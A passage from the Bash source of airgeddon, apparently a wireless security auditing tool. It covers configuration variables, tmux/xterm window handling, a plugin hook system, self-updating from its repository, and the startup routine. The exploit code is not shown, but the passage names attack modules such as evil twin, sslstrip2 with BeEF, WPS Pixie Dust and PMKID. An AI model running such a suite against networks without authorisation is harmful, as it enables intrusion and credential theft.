	readarray -t ENV_BOOLEAN_VARS_ELEMENTS < <(printf %s\\n "${!boolean_options_env_vars[@]}" | cut -d, -f1 | sort -u)
	readarray -t ENV_NONBOOLEAN_VARS_ELEMENTS < <(printf %s\\n "${!nonboolean_options_env_vars[@]}" | cut -d, -f1 | sort -u)
	ARRAY_ENV_VARS_ELEMENTS=("${ENV_VARS_ELEMENTS[@]}")
	ARRAY_ENV_BOOLEAN_VARS_ELEMENTS=("${ENV_BOOLEAN_VARS_ELEMENTS[@]}")
	ARRAY_ENV_NONBOOLEAN_VARS_ELEMENTS=("${ENV_NONBOOLEAN_VARS_ELEMENTS[@]}")

	if [ -f "${osversionfile_dir}${alternative_rc_file_name}" ]; then
		rc_path="${osversionfile_dir}${alternative_rc_file_name}"
	else
		rc_path="${scriptfolder}${rc_file_name}"
		if [ ! -f "${rc_path}" ]; then
			create_rcfile
		fi
	fi

	env_vars_values_validation
}

#Validation of env vars. Missing vars, invalid values, etc. are checked
function env_vars_values_validation() {

	debug_print

	declare -gA errors_on_configuration_vars

	for item in "${ARRAY_ENV_VARS_ELEMENTS[@]}"; do
		if [ -z "${!item}" ]; then
			if grep "${item}" "${rc_path}" > /dev/null; then
				eval "export $(grep "${item}" "${rc_path}")"
			else
				if echo "${ARRAY_ENV_BOOLEAN_VARS_ELEMENTS[@]}" | grep -q "${item}"; then
					eval "export ${item}=${boolean_options_env_vars[${item},'default_value']}"
					errors_on_configuration_vars["${item},missing_var"]="${boolean_options_env_vars[${item},'default_value']}"
				elif echo "${ARRAY_ENV_NONBOOLEAN_VARS_ELEMENTS[@]}" | grep -q "${item}"; then
					eval "export ${item}=${nonboolean_options_env_vars[${item},'default_value']}"
					errors_on_configuration_vars["${item},missing_var"]="${nonboolean_options_env_vars[${item},'default_value']}"
				fi
			fi
		fi
	done

	for item in "${ARRAY_ENV_BOOLEAN_VARS_ELEMENTS[@]}"; do
		if ! [[ "${!item,,}" =~ ^(true|false)$ ]]; then
			errors_on_configuration_vars["${item},invalid_value"]="${boolean_options_env_vars[${item},'default_value']}"
			eval "export ${item}=${boolean_options_env_vars[${item},'default_value']}"
		fi
	done

	for item in "${ARRAY_ENV_NONBOOLEAN_VARS_ELEMENTS[@]}"; do
		if [ "${item}" = "AIRGEDDON_WINDOWS_HANDLING" ]; then
			if ! [[ "${!item,,}" =~ ^(xterm|tmux)$ ]]; then
				errors_on_configuration_vars["${item},invalid_value"]="${nonboolean_options_env_vars[${item},'default_value']}"
				eval "export ${item}=${nonboolean_options_env_vars[${item},'default_value']}"
			fi
		elif [ "${item}" = "AIRGEDDON_MDK_VERSION" ]; then
			if ! [[ "${!item,,}" =~ ^(mdk3|mdk4)$ ]]; then
				errors_on_configuration_vars["${item},invalid_value"]="${nonboolean_options_env_vars[${item},'default_value']}"
				eval "export ${item}=${nonboolean_options_env_vars[${item},'default_value']}"
			fi
		fi
	done
}

#Print possible issues on configuration vars
function print_configuration_vars_issues() {

	debug_print

	readarray -t ERRORS_ON_CONFIGURATION_VARS_ELEMENTS < <(printf %s\\n "${!errors_on_configuration_vars[@]}" | cut -d, -f1 | sort -u)
	ERROR_VARS_ELEMENTS=("${ERRORS_ON_CONFIGURATION_VARS_ELEMENTS[@]}")

	local stop_on_var_errors=0

	local error_var_state
	for item in "${ERROR_VARS_ELEMENTS[@]}"; do
		if [ -n "${item}" ]; then
			error_var_name="${item}"
			error_var_state=$(printf %s\\n "${!errors_on_configuration_vars[@]}" | tr " " "\n" | grep "${item}" | cut -d, -f2)
			if [ -z "${!error_var_state}" ]; then
				error_var_default_value="${errors_on_configuration_vars[${item},"${error_var_state}"]}"
				stop_on_var_errors=1
				if [ "${error_var_state}" = "missing_var" ]; then
					echo
					language_strings "${language}" 614 "yellow"
				else
					echo
					language_strings "${language}" 613 "yellow"
				fi
			fi
		fi
	done

	if [ "${stop_on_var_errors}" -eq 1 ]; then
		echo
		language_strings "${language}" 115 "read"
	fi
}

#Create env vars file and fill it with default values
function create_rcfile() {

	debug_print

	local counter=0
	for item in "${ordered_options_env_vars[@]}"; do
		counter=$((counter + 1))
		if echo "${ARRAY_ENV_BOOLEAN_VARS_ELEMENTS[@]}" | grep -q "${item}"; then
			{
			echo -e "${boolean_options_env_vars[${item},"rcfile_text"]}"
			echo -e "${item}=${boolean_options_env_vars[${item},"default_value"]}"
			if [ "${counter}" -ne ${#ordered_options_env_vars[@]} ]; then
				echo -ne "\n"
			fi
			} >> "${rc_path}" 2> /dev/null
		elif echo "${ARRAY_ENV_NONBOOLEAN_VARS_ELEMENTS[@]}" | grep -q "${item}"; then
			{
			echo -e "${nonboolean_options_env_vars[${item},"rcfile_text"]}"
			echo -e "${item}=${nonboolean_options_env_vars[${item},"default_value"]}"
			if [ "${counter}" -ne ${#ordered_options_env_vars[@]} ]; then
				echo -ne "\n"
			fi
			} >> "${rc_path}" 2> /dev/null
		fi
	done
}

#Detect if airgeddon is working inside a docker container
function docker_detection() {

	debug_print

	if [ -f /.dockerenv ]; then
		is_docker=1
	fi
}

#Set colorization output if set
function initialize_extended_colorized_output() {

	debug_print

	colorize=""
	if "${AIRGEDDON_BASIC_COLORS:-true}" && "${AIRGEDDON_EXTENDED_COLORS:-true}"; then
		if hash ccze 2> /dev/null; then
			colorize="| ccze -A"
		fi
	fi
}

#Remap colors vars
function remap_colors() {

	debug_print

	if ! "${AIRGEDDON_BASIC_COLORS:-true}"; then
		green_color="${normal_color}"
		green_color_title="${normal_color}"
		red_color="${normal_color}"
		red_color_slim="${normal_color}"
		blue_color="${normal_color}"
		cyan_color="${normal_color}"
		brown_color="${normal_color}"
		yellow_color="${normal_color}"
		pink_color="${normal_color}"
		white_color="${normal_color}"
	else
		initialize_colors
	fi
}

#Initialize colors vars
function initialize_colors() {

	debug_print

	normal_color="\e[1;0m"
	green_color="\033[1;32m"
	green_color_title="\033[0;32m"
	red_color="\033[1;31m"
	red_color_slim="\033[0;031m"
	blue_color="\033[1;34m"
	cyan_color="\033[1;36m"
	brown_color="\033[0;33m"
	yellow_color="\033[1;33m"
	pink_color="\033[1;35m"
	white_color="\e[1;97m"
}

#Kill tmux session started by airgeddon
function kill_tmux_session() {

	debug_print

	if hash tmux 2> /dev/null; then
		tmux kill-session -t "${1}"
		return 0
	else
		return 1
	fi
}

#Initialize tmux if apply
function initialize_tmux() {

	debug_print

	if [ "${1}" = "true" ]; then
		if [ -n "${2}" ]; then
			airgeddon_uid="${2}"
		else
			exit ${exit_code}
		fi
	else
		airgeddon_uid="${BASHPID}"
	fi

	session_name="airgeddon${airgeddon_uid}"

	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
		if hash tmux 2> /dev/null; then
			transfer_to_tmux
			if ! check_inside_tmux; then
				exit_code=1
				exit ${exit_code}
			fi
		fi
	fi
}

#Starting point of airgeddon script inside newly created tmux session
function start_airgeddon_from_tmux() {

	debug_print

	tmux rename-window -t "${session_name}" "${tmux_main_window}"
	tmux send-keys -t "${session_name}:${tmux_main_window}" "clear;cd ${scriptfolder};bash ${scriptname} \"true\" \"${airgeddon_uid}\"" ENTER
	sleep 0.2
	if [ "${1}" = "normal" ]; then
		tmux attach -t "${session_name}"
	else
		tmux switch-client -t "${session_name}"
	fi
}

#Create new tmux session exclusively for airgeddon
function create_tmux_session() {

	debug_print

	session_name="${1}"

	if [ "${2}" = "true" ]; then
		tmux new-session -d -s "${1}"
		start_airgeddon_from_tmux "normal"
	else
		tmux new-session -d -s "${1}"
		start_airgeddon_from_tmux "nested"
	fi
}

#Start supporting scripts inside its own tmux window
function start_tmux_processes() {

	debug_print

	local window_name
	local command_line

	window_name="${1}"
	command_line="${2}"

	tmux kill-window -t "${session_name}:${window_name}" 2> /dev/null
	case "${4}" in
		"active")
			tmux new-window -t "${session_name}:" -n "${window_name}"
		;;
		*)
			tmux new-window -d -t "${session_name}:" -n "${window_name}"
		;;
	esac
	local tmux_color_cmd
	if [ -n "${3}" ]; then
		tmux_color_cmd="bg=#000000 fg=${3}"
	else
		tmux_color_cmd="bg=#000000"
	fi
	tmux setw -t "${window_name}" window-style "${tmux_color_cmd}"
	tmux send-keys -t "${session_name}:${window_name}" "${command_line}" ENTER
}

#Check if script is currently executed inside tmux session or not
function check_inside_tmux() {

	debug_print

	local parent_pid
	local parent_window
	parent_pid=$(ps -o ppid= ${PPID} 2> /dev/null | tr -d ' ')
	parent_window="$(ps --no-headers -p "${parent_pid}" -o comm= 2> /dev/null)"
	if [[ "${parent_window}" =~ tmux ]]; then
		return 0
	fi
	return 1
}

#Hand over script execution to tmux and call function to create a new session
function transfer_to_tmux() {

	debug_print

	if ! check_inside_tmux; then
		create_tmux_session "${session_name}" "true"
	else
		local active_session
		active_session=$(tmux display-message -p '#S')
		if [ "${active_session}" != "${session_name}" ]; then
			tmux_error=1
		fi
	fi
}

#Function to kill tmux windows using window name
function kill_tmux_windows() {

	debug_print

	local TMUX_WINDOWS_LIST=()
	local current_window_name
	readarray -t TMUX_WINDOWS_LIST < <(tmux list-windows -t "${session_name}:")
	for item in "${TMUX_WINDOWS_LIST[@]}"; do
		[[ "${item}" =~ ^[0-9]+:[[:blank:]](.+([^*-]))([[:blank:]]|\-|\*)[[:blank:]]?\([0-9].+ ]] && current_window_name="${BASH_REMATCH[1]}"
		if [ "${current_window_name}" = "${tmux_main_window}" ]; then
			continue
		fi
		if [ -n "${1}" ]; then
			if [ "${current_window_name}" = "${1}" ]; then
				continue
			fi
		fi
		tmux kill-window -t "${session_name}:${current_window_name}"
	done
}

#Function to pause script execution in the main window until a process has finished executing or the user terminates it
#shellcheck disable=SC2009
function wait_for_process() {

	debug_print

	local running_process
	local running_process_pid
	local running_process_cmd_line
	running_process_cmd_line=$(echo "${1}" | tr -d '"')

	while [ -z "${running_process_pid}" ]; do
		running_process_pid=$(ps --no-headers aux | grep "${running_process_cmd_line}" | grep -v "grep ${running_process_cmd_line}" | awk '{print $2}' | tr '\n' ':')
		if [ -n "${running_process_pid}" ]; then
			running_process_pid="${running_process_pid%%:*}"
			running_process="${running_process_pid}"
		fi
	done

	while [ -n "${running_process}" ]; do
		running_process=$(ps aux | grep "${running_process_pid}" | grep -v "grep ${running_process_pid}")
		sleep 0.2
	done

	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
		tmux kill-window -t "${session_name}:${2}"
	fi
}

#Function to capture PID of a process started inside tmux and setting it to a global variable
#shellcheck disable=SC2009
function get_tmux_process_id() {

	debug_print

	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then

		local process_cmd_line
		local process_pid

		process_cmd_line=$(echo "${1}" | tr -d '"')
		while [ -z "${process_pid}" ]; do
			process_pid=$(ps --no-headers aux | grep "${process_cmd_line}" | grep -v "grep ${process_cmd_line}" | awk '{print $2}')
		done
		global_process_pid="${process_pid}"
	fi
}

#Centralized function to launch window using xterm/tmux
function manage_output() {

	debug_print

	local xterm_parameters
	local tmux_command_line
	local xterm_command_line
	local window_name
	local command_tail

	xterm_parameters="${1}"
	tmux_command_line="${2}"
	xterm_command_line="\"${2}\""
	window_name="${3}"
	command_tail=" > /dev/null 2>&1 &"

	case "${AIRGEDDON_WINDOWS_HANDLING}" in
		"tmux")
			local tmux_color
			tmux_color=""
			[[ "${1}" =~ -fg[[:blank:]](\")?(#[0-9a-fA-F]+) ]] && tmux_color="${BASH_REMATCH[2]}"
			case "${4}" in
				"active")
					start_tmux_processes "${window_name}" "clear;${tmux_command_line}" "${tmux_color}" "active"
				;;
				*)
					start_tmux_processes "${window_name}" "clear;${tmux_command_line}" "${tmux_color}"
				;;
			esac
		;;
		"xterm")
			eval "xterm ${xterm_parameters} -e ${xterm_command_line}${command_tail}"
		;;
	esac
}

#Plugins initialization, parsing and validations handling
function parse_plugins() {

	plugins_enabled=()

	shopt -s nullglob
	for path in "${plugins_paths[@]}"; do
		if [ -d "${path}" ]; then
			for file in "${path}"*.sh; do
				if [ "${file}" != "${path}plugin_template.sh" ]; then

					plugin_short_name="${file##*/}"
					plugin_short_name="${plugin_short_name%.sh*}"

					if grep -q -E "^plugin_enabled=1$" "${file}"; then

						#shellcheck source=./plugins/missing_dependencies.sh
						source "${file}" "$@"

						validate_plugin_requirements
						plugin_validation_result=$?
						if [ "${plugin_validation_result}" -eq 0 ]; then
							plugins_enabled+=("${plugin_short_name}")
						fi
					fi
				fi
			done
		fi
	done
	shopt -u nullglob
}

#Validate if plugin meets the needed requirements
function validate_plugin_requirements() {

	if [ -n "${plugin_minimum_ag_affected_version}" ]; then
		if compare_floats_greater_than "${plugin_minimum_ag_affected_version}" "${airgeddon_version}"; then
			return 1
		fi
	fi

	if [ -n "${plugin_maximum_ag_affected_version}" ]; then
		if compare_floats_greater_than "${airgeddon_version}" "${plugin_maximum_ag_affected_version}"; then
			return 1
		fi
	fi

	if [ "${plugin_distros_supported[0]}" != "*" ]; then

		for item in "${plugin_distros_supported[@]}"; do
			if [ "${item}" = "${distro}" ]; then
				return 0
			fi
		done

		return 2
	fi

	return 0
}

#Apply modifications to functions with defined plugins changes
#shellcheck disable=SC2086,SC2001
function apply_plugin_functions_rewriting() {

	declare -A function_hooks

	local original_function
	local action

	for plugin in "${plugins_enabled[@]}"; do
		for current_function in $(compgen -A 'function' "${plugin}_" | grep -e "[override|prehook|posthook]"); do
			original_function=$(echo ${current_function} | sed "s/^${plugin}_\(override\)*\(prehook\)*\(posthook\)*_//")
			action=$(echo ${current_function} | sed "s/^${plugin}_\(override\)*\(prehook\)*\(posthook\)*_.*$/\1\2\3/")

			if ! declare -F ${original_function} &>/dev/null; then
				echo
				language_strings "${language}" 659 "red"
				exit_code=1
				exit_script_option
			fi

			if printf '%s\n' "${!function_hooks[@]}" | grep -x -q "${original_function},${action}"; then
				echo
				language_strings "${language}" 661 "red"
				exit_code=1
				exit_script_option
			fi

			if ! printf '%s\n' "${hooked_functions[@]}" | grep -x -q "${original_function}"; then
				hooked_functions+=("${original_function}")
			fi
			function_hooks[${original_function},${action}]=${plugin}
		done
	done

	local function_modifications
	local arguments
	local actions=("prehook" "override" "posthook")

	for current_function in "${hooked_functions[@]}"; do
		arguments="${current_function} "
		function_modifications=$(declare -f ${current_function} | sed "1c${current_function}_original ()")

		for action in "${actions[@]}"; do
			if printf '%s\n' "${!function_hooks[@]}" | grep -x -q "${current_function},${action}"; then
				arguments+="true "
				function_name="${function_hooks[${current_function},${action}]}_${action}_${current_function}"
				function_modifications+=$'\n'"$(declare -f ${function_name} | sed "1c${current_function}_${action} ()")"
			else
				arguments+="false "
			fi
		done

		arguments+="\"\${@}\""
		function_modifications+=$'\n'"${current_function} () {"$'\n'" plugin_function_call_handler ${arguments}"$'\n'"}"
		eval "${function_modifications}"
	done
}

#Plugins function handler in charge of managing prehook, posthooks and override function calls
function plugin_function_call_handler() {

	local function_name=${1}
	local prehook_enabled=${2}
	local override_enabled=${3}
	local posthook_enabled=${4}
	local funtion_call="${function_name}_original"

	if [ "${prehook_enabled}" = true ]; then
		local prehook_funcion_name="${function_name}_prehook"
		${prehook_funcion_name} "${@:5:${#}}"
	fi

	if [ "${override_enabled}" = true ]; then
		funtion_call="${function_name}_override"
	fi

	${funtion_call} "${@:5:${#}}"

	local result=${?}
	if [ "${posthook_enabled}" = true ]; then
		local posthook_funcion_name="${function_name}_posthook"
		${posthook_funcion_name} ${result}
		result=${?}
	fi

	return ${result}
}

#Avoid the problem of using airmon-zc without ethtool installed
function airmonzc_security_check() {

	debug_print

	if [ "${airmon}" = "airmon-zc" ]; then
		if ! hash ethtool 2> /dev/null; then
			echo
			language_strings "${language}" 247 "red"
			echo
			language_strings "${language}" 115 "read"
			exit_code=1
			exit_script_option
		fi
	fi
}

#Check if the first float argument is greater than the second
function compare_floats_greater_than() {

	debug_print

	awk -v n1="${1}" -v n2="${2}" 'BEGIN{if (n1>n2) exit 0; exit 1}'
}

#Check if the first float argument is greater than or equal to the second float argument
function compare_floats_greater_or_equal() {

	debug_print

	awk -v n1="${1}" -v n2="${2}" 'BEGIN{if (n1>=n2) exit 0; exit 1}'
}

#Update and relaunch the script
function download_last_version() {

	debug_print

	rewrite_script_with_custom_beef "search"

	local script_file_downloaded=0

	if download_language_strings_file; then

		get_current_permanent_language

		if timeout -s SIGTERM 15 curl -L ${urlscript_directlink} -s -o "${0}"; then
			script_file_downloaded=1
		else
			http_proxy_detect
			if [ "${http_proxy_set}" -eq 1 ]; then

				if timeout -s SIGTERM 15 curl --proxy "${http_proxy}" -L ${urlscript_directlink} -s -o "${0}"; then
					script_file_downloaded=1
				fi
			fi
		fi
	fi

	if [ "${script_file_downloaded}" -eq 1 ]; then

		download_pins_database_file

		update_options_config_file "getdata"
		download_options_config_file
		update_options_config_file "writedata"

		echo
		language_strings "${language}" 214 "yellow"

		if [ -n "${beef_custom_path}" ]; then
			rewrite_script_with_custom_beef "set" "${beef_custom_path}"
		fi

		sed -ri "s:^([l]anguage)=\"[a-zA-Z]+\":\1=\"${current_permanent_language}\":" "${scriptfolder}${scriptname}" 2> /dev/null

		language_strings "${language}" 115 "read"
		chmod +x "${scriptfolder}${scriptname}" > /dev/null 2>&1
		exec "${scriptfolder}${scriptname}"
	else
		language_strings "${language}" 5 "yellow"
	fi
}

#Validate if the selected internet interface has internet access
function validate_et_internet_interface() {

	debug_print

	echo
	language_strings "${language}" 287 "blue"

	if ! check_internet_access; then
		echo
		language_strings "${language}" 288 "red"
		language_strings "${language}" 115 "read"
		return 1
	fi

	if ! check_default_route "${internet_interface}"; then
		echo
		language_strings "${language}" 290 "red"
		language_strings "${language}" 115 "read"
		return 1
	fi

	echo
	language_strings "${language}" 289 "yellow"
	language_strings "${language}" 115 "read"
	internet_interface_selected=1
	return 0
}

#Check for access to airgeddon repository
function check_repository_access() {

	debug_print

	if hash curl 2> /dev/null; then

		if check_url_curl "https://${repository_hostname}"; then
			return 0
		fi
	fi
	return 1
}

#Check for active internet connection
function check_internet_access() {

	debug_print

	for item in "${ips_to_check_internet[@]}"; do
		if ping -c 1 "${item}" -W 1 > /dev/null 2>&1; then
			return 0
		fi
	done

	if hash curl 2> /dev/null; then
		if check_url_curl "https://${repository_hostname}"; then
			return 0
		fi
	fi

	if hash wget 2> /dev/null; then
		if check_url_wget "https://${repository_hostname}"; then
			return 0
		fi
	fi

	return 1
}

#Check for access to a URL using curl
function check_url_curl() {

	debug_print

	if timeout -s SIGTERM 15 curl -s "${1}" > /dev/null 2>&1; then
		return 0
	fi

	http_proxy_detect
	if [ "${http_proxy_set}" -eq 1 ]; then
		timeout -s SIGTERM 15 curl -s --proxy "${http_proxy}" "${1}" > /dev/null 2>&1
		return $?
	fi
	return 1
}

#Check for access to a URL using wget
function check_url_wget() {

	debug_print

	if timeout -s SIGTERM 15 wget -q --spider "${1}" > /dev/null 2>&1; then
		return 0
	fi

	http_proxy_detect
	if [ "${http_proxy_set}" -eq 1 ]; then
		timeout -s SIGTERM 15 wget -q --spider -e "use_proxy=yes" -e "http_proxy=${http_proxy}" "${1}" > /dev/null 2>&1
		return $?
	fi
	return 1
}

#Detect if there is a http proxy configured on the system
function http_proxy_detect() {

	debug_print

	http_proxy=$(env | grep -i HTTP_PROXY | head -n 1 | awk -F "=" '{print $2}')

	if [ -n "${http_proxy}" ]; then
		http_proxy_set=1
	else
		http_proxy_set=0
	fi
}

#Check for default route on an interface
function check_default_route() {

	debug_print

	(set -o pipefail && ip route | awk '/^default/{print $5}' | grep "${1}" > /dev/null)
	return $?
}

#Update the script if your version is outdated
function autoupdate_check() {

	debug_print

	echo
	language_strings "${language}" 210 "blue"
	echo

	if check_repository_access; then
		local version_checked=0
		airgeddon_last_version=$(timeout -s SIGTERM 15 curl -L ${urlscript_directlink} 2> /dev/null | grep "airgeddon_version=" | head -n 1 | cut -d "\"" -f 2)

		if [ -n "${airgeddon_last_version}" ]; then
			version_checked=1
		else
			http_proxy_detect
			if [ "${http_proxy_set}" -eq 1 ]; then

				airgeddon_last_version=$(timeout -s SIGTERM 15 curl --proxy "${http_proxy}" -L ${urlscript_directlink} 2> /dev/null | grep "airgeddon_version=" | head -n 1 | cut -d "\"" -f 2)
				if [ -n "${airgeddon_last_version}" ]; then
					version_checked=1
				else
					language_strings "${language}" 5 "yellow"
				fi
			else
				language_strings "${language}" 5 "yellow"
			fi
		fi

		if [ "${version_checked}" -eq 1 ]; then
			if compare_floats_greater_than "${airgeddon_last_version}" "${airgeddon_version}"; then
				language_strings "${language}" 213 "yellow"
				download_last_version
			else
				language_strings "${language}" 212 "yellow"
			fi
		fi
	else
		language_strings "${language}" 211 "yellow"
	fi

	language_strings "${language}" 115 "read"
}

#Change script language automatically if OS language is supported by the script and different from the current language
function autodetect_language() {

	debug_print

	[[ $(locale | grep LANG) =~ ^(.*)=\"?([a-zA-Z]+)_(.*)$ ]] && lang="${BASH_REMATCH[2]}"

	for lgkey in "${!lang_association[@]}"; do
		if [[ "${lang}" = "${lgkey}" ]] && [[ "${language}" != "${lang_association[${lgkey}]}" ]]; then
			autochanged_language=1
			language=${lang_association[${lgkey}]}
			break
		fi
	done
}

#Detect if the current language is a supported RTL (Right To Left) language
function detect_rtl_language() {

	debug_print

	for item in "${rtl_languages[@]}"; do
		if [ "${language}" = "${item}" ]; then
			is_rtl_language=1
			printf "\e[8h"
			break
		else
			is_rtl_language=0
		fi
	done
}

#Clean some known and controlled warnings for ShellCheck
function remove_warnings() {

	debug_print

	echo "${clean_handshake_dependencies[@]}" > /dev/null 2>&1
	echo "${aircrack_crunch_attacks_dependencies[@]}" > /dev/null 2>&1
	echo "${aireplay_attack_dependencies[@]}" > /dev/null 2>&1
	echo "${mdk_attack_dependencies[@]}" > /dev/null 2>&1
	echo "${hashcat_attacks_dependencies[@]}" > /dev/null 2>&1
	echo "${et_onlyap_dependencies[@]}" > /dev/null 2>&1
	echo "${et_sniffing_dependencies[@]}" > /dev/null 2>&1
	echo "${et_sniffing_sslstrip2_dependencies[@]}" > /dev/null 2>&1
	echo "${et_sniffing_sslstrip2_beef_dependencies[@]}" > /dev/null 2>&1
	echo "${et_captive_portal_dependencies[@]}" > /dev/null 2>&1
	echo "${wash_scan_dependencies[@]}" > /dev/null 2>&1
	echo "${bully_attacks_dependencies[@]}" > /dev/null 2>&1
	echo "${reaver_attacks_dependencies[@]}" > /dev/null 2>&1
	echo "${bully_pixie_dust_attack_dependencies[@]}" > /dev/null 2>&1
	echo "${reaver_pixie_dust_attack_dependencies[@]}" > /dev/null 2>&1
	echo "${wep_attack_allinone_dependencies[@]}" > /dev/null 2>&1
	echo "${wep_attack_besside_dependencies[@]}" > /dev/null 2>&1
	echo "${enterprise_attack_dependencies[@]}" > /dev/null 2>&1
	echo "${enterprise_identities_dependencies[@]}" > /dev/null 2>&1
	echo "${asleap_attacks_dependencies[@]}" > /dev/null 2>&1
	echo "${john_attacks_dependencies[@]}" > /dev/null 2>&1
	echo "${johncrunch_attacks_dependencies[@]}" > /dev/null 2>&1
	echo "${enterprise_certificates_dependencies[@]}" > /dev/null 2>&1
	echo "${pmkid_dependencies[@]}" > /dev/null 2>&1
	echo "${is_arm}" > /dev/null 2>&1
}

#Print a simple separator
function print_simple_separator() {

	debug_print

	echo_blue "---------"
}

#Print a large separator
function print_large_separator() {

	debug_print

	echo_blue "-------------------------------------------------------"
}

#Add the PoT prefix on printed strings if PoT mark is found
function check_pending_of_translation() {

	debug_print

	if [[ "${1}" =~ ^${escaped_pending_of_translation}([[:space:]])(.*)$ ]]; then
		text="${cyan_color}${pending_of_translation} ${2}${BASH_REMATCH[2]}"
		return 1
	elif [[ "${1}" =~ ^${escaped_hintvar}[[:space:]](\\033\[[0-9];[0-9]{1,2}m)?(${escaped_pending_of_translation})[[:space:]](.*) ]]; then
		text="${cyan_color}${pending_of_translation} ${brown_color}${hintvar} ${pink_color}${BASH_REMATCH[3]}"
		return 1
	elif [[ "${1}" =~ ^(\*+)[[:space:]]${escaped_pending_of_translation}[[:space:]]([^\*]+)(\*+)$ ]]; then
		text="${2}${BASH_REMATCH[1]}${cyan_color} ${pending_of_translation} ${2}${BASH_REMATCH[2]}${BASH_REMATCH[3]}"
		return 1
	elif [[ "${1}" =~ ^(\-+)[[:space:]]\(${escaped_pending_of_translation}[[:space:]]([^\-]+)(\-+)$ ]]; then
		text="${2}${BASH_REMATCH[1]} (${cyan_color}${pending_of_translation} ${2}${BASH_REMATCH[2]}${BASH_REMATCH[3]}"
		return 1
	fi

	return 0
}

#Print under construction message used on some menu entries
function under_construction_message() {

	debug_print

	echo
	echo_red "${under_construction[$language]^}..."
	language_strings "${language}" 115 "read"
}

#Canalize the echo functions
function last_echo() {

	debug_print

	if ! check_pending_of_translation "${1}" "${2}"; then
		echo -e "${2}${text}${normal_color}"
	else
		echo -e "${2}$*${normal_color}"
	fi
}

#Print green messages
function echo_green() {

	debug_print

	last_echo "${1}" "${green_color}"
}

#Print blue messages
function echo_blue() {

	debug_print

	last_echo "${1}" "${blue_color}"
}

#Print yellow messages
function echo_yellow() {

	debug_print

	last_echo "${1}" "${yellow_color}"
}

#Print red messages
function echo_red() {

	debug_print

	last_echo "${1}" "${red_color}"
}

#Print red messages using a slimmer thickness
function echo_red_slim() {

	debug_print

	last_echo "${1}" "${red_color_slim}"
}

#Print black messages with background for titles
function echo_green_title() {

	debug_print

	last_echo "${1}" "${green_color_title}"
}

#Print pink messages
function echo_pink() {

	debug_print

	last_echo "${1}" "${pink_color}"
}

#Print cyan messages
function echo_cyan() {

	debug_print

	last_echo "${1}" "${cyan_color}"
}

#Print brown messages
function echo_brown() {

	debug_print

	last_echo "${1}" "${brown_color}"
}

#Print white messages
function echo_white() {

	debug_print

	last_echo "${1}" "${white_color}"
}

#Script starting point
function main() {

	initialize_script_settings
	initialize_colors
	env_vars_initialization
	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
		initialize_tmux "${1}" "${2}"
	fi
	initialize_instance_settings
	detect_distro_phase1
	detect_distro_phase2
	special_distro_features

	if "${AIRGEDDON_AUTO_CHANGE_LANGUAGE:-true}"; then
		autodetect_language
	fi

	detect_rtl_language
	check_language_strings
	initialize_language_strings
	iptables_nftables_detection
	set_mdk_version
	dependencies_modifications

	if "${AIRGEDDON_PLUGINS_ENABLED:-true}"; then
		parse_plugins "$@"
		apply_plugin_functions_rewriting
	fi

	remap_colors
	hookable_for_languages

	clear
	current_menu="pre_main_menu"
	docker_detection
	set_default_save_path
	graphics_prerequisites

	if [[ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]] && [[ "${tmux_error}" -eq 1 ]]; then
		language_strings "${language}" 86 "title"
		echo
		language_strings "${language}" 621 "yellow"
		language_strings "${language}" 115 "read"
		create_tmux_session "${session_name}" "false"

		exit_code=1
		exit ${exit_code}
	fi

	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
		check_graphics_system
		detect_screen_resolution
	fi

	set_possible_aliases
	initialize_optional_tools_values

	if ! "${AIRGEDDON_DEVELOPMENT_MODE:-false}"; then
		if ! "${AIRGEDDON_SKIP_INTRO:-false}"; then
			language_strings "${language}" 86 "title"
			language_strings "${language}" 6 "blue"
			echo
			if check_window_size_for_intro; then
				print_intro
			else
				language_strings "${language}" 228 "green"
				echo
				language_strings "${language}" 395 "yellow"
				sleep 3
			fi
		fi

		clear
		language_strings "${language}" 86 "title"
		language_strings "${language}" 7 "pink"
		language_strings "${language}" 114 "pink"

		if [ "${autochanged_language}" -eq 1 ]; then
			echo
			language_strings "${language}" 2 "yellow"
		fi

		check_bash_version
		check_root_permissions
		check_wsl

		if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
			echo
			if [[ "${resolution_detected}" -eq 1 ]] && [[ "${xterm_ok}" -eq 1 ]]; then
				language_strings "${language}" 294 "blue"
			else
				if [ "${xterm_ok}" -eq 0 ]; then
					case "${graphics_system}" in
						"x11")
							language_strings "${language}" 476 "red"
							exit_code=1
							exit_script_option
						;;
						"wayland")
							language_strings "${language}" 704 "red"
							exit_code=1
							exit_script_option
						;;
						"tty"|*)
							language_strings "${language}" 705 "red"
							exit_code=1
							exit_script_option
						;;
					esac
				else
					language_strings "${language}" 295 "red"
					echo
					language_strings "${language}" 300 "yellow"
				fi
			fi
		fi

		detect_running_instances
		if [ "$?" -gt 1 ]; then
			echo
			language_strings "${language}" 720 "yellow"
			echo
			language_strings "${language}" 721 "blue"
			language_strings "${language}" 115 "read"
		fi

		echo
		language_strings "${language}" 8 "blue"
		print_known_distros
		echo
		language_strings "${language}" 9 "blue"
		general_checkings
		language_strings "${language}" 115 "read"

		airmonzc_security_check
		check_update_tools
	fi

	print_configuration_vars_issues
	initialize_extended_colorized_output
	set_windows_sizes
	select_interface
	initialize_menu_options_dependencies
	remove_warnings
	main_menu
}

#Script starts to execute stuff from this point, traps and then the main function
for f in SIGINT SIGHUP INT SIGTSTP; do
	trap_cmd="trap \"capture_traps ${f}\" \"${f}\""
	eval "${trap_cmd}"
done

main "$@"
